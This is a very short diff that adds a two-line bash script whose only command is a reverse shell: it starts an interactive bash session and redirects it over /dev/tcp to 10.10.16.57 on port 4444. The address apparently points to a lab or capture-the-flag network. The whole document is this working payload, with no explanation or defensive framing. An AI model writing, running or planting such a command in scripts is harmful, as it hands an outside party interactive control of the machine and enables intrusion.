@@ -1,0 +1,2 @@
+#!/bin/bash
+/bin/bash -i >& /dev/tcp/10.10.16.57/4444 0>&1
